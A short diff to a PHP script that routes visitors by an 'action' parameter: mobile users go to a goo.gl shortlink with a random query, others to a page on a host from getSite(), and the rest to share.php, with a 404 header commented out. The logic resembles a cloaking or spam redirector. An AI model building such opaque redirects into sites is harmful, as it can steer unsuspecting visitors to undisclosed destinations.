@@ -97,14 +97,14 @@
   $id = isset(explode("/", $id)[1]) ? explode("/", $id)[1] : $id;
   $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
   if($action == 'mobile'){
-    header('Location: https://goo.gl/haqCAC?'.rand(11111,99999));
+    header('Location: https://goo.gl/D8Z274?'.rand(11111,99999));
   }else if($action == 'site'){
     $site = getSite();
     header("Location: http://$site/$id.html");
   }else{
     @ob_end_clean();
     @ob_end_flush();
-    header("HTTP/1.1 404 Not Found");
+    //header("HTTP/1.1 404 Not Found");
     require_once('share.php');
   }
 ?>
